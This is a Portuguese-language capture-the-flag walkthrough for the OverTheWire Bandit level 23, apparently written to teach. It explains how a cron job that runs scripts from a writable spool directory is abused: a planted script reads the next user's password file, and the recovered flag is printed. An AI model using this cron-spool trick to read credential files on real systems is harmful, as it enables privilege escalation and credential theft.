# 🕵️ Bandit 23

Um programa está sendo executado automaticamente em intervalos regulares a partir do cron , o agendador de tarefas baseado em tempo. Procure em /etc/cron.d/ a configuração e veja qual comando está sendo executado.


## Solução

Verificando o processo que está sendo executado no cron para este nível:
```
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Analisando o funcionamento do script que será executado, notamos que ele irá percorrer todos os arquivos do diretório /var/spool/bandit24 e executa-los caso o owner seja bandit23. Após a execução excluirá o arquivo.

Dessa forma, o que precisamos fazer é criar um arquivo para buscar a flag por nós no momento em que o cron disparar este job.

Vamos começar criando um diretório para obter a flag:
```
bandit23@bandit:/etc/cron.d$ mkdir /tmp/bdt24
bandit23@bandit:/etc/cron.d$ cd /tmp/bdt24
```

Em seguida, precisamos somente de um arquivo que faça a leitura da flag e salve em um arquivo em nosso diretório criado. Para isso, podemos fazer um simples cat no arquivo e direcionar a saida para o arquivo .txt:
```
bandit23@bandit:/tmp/bdt24$ nano exploit.sh

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/bdt24/pass.txt
```

Com o script pronto, precisamos conceder permissão de execução para o arquivo shell e de escrita para o arquivo texto. Dessa forma, quando copiarmos o arquivo para o diretório var/spool, quando o cron executar novamente a rotina, escreverá a flag no nosso arquivo txt:
```
bandit23@bandit:/tmp/bdt24$ touch pass.txt
bandit23@bandit:/tmp/bdt24$ chmod 777 exploit.sh 
bandit23@bandit:/tmp/bdt24$ chmod 666 pass.txt 
bandit23@bandit:/tmp/bdt24$ cp exploit.sh /var/spool/bandit24/
```

Após esperar um tempo até o cron executar o job novamente (cerca de 1 minuto), podemos verificar o retorno no arquivo:
```
bandit23@bandit:/tmp/bdt24$ cat pass.txt 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

Obtemos a flag! 🥷

## Conceitos utilizados

- Construção de shell script
- permissões de arquivos

## Links úteis

-
-

